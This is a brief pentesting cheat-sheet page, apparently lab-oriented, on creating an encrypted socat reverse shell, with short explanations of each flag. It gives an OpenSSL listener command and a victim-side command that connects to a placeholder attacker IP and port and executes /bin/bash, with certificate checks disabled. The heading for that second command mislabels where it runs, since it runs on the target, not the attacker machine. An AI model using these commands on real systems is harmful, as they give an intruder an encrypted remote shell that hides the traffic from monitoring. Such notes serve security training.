---
description: Encrypted communications
---

# Socat

Setup a listener encrypted

```sh
socat -d -d OPENSSL-LISTEN:<ATTACKERPORT>,cert=thm-reverse.pem,verify=0,fork STDOUT
```

* `-d -d` provides some debugging data (fatal, error, warning, and notice messages)
* `OPENSSL-LISTEN:PORT_NUM` indicates that the connection will be encrypted using OPENSSL
* `cert=PEM_FILE` provides the PEM file (certificate and private key) to establish the encrypted connection
* `verify=0` disables checking peer’s certificate
* `fork` creates a sub-process to handle each new connection.



Call the encrypted listener from attacker machine

```sh
socat OPENSSL:<ATTACKERIP>:<ATTACKERPORT>,verify=0 EXEC:/bin/bash
```
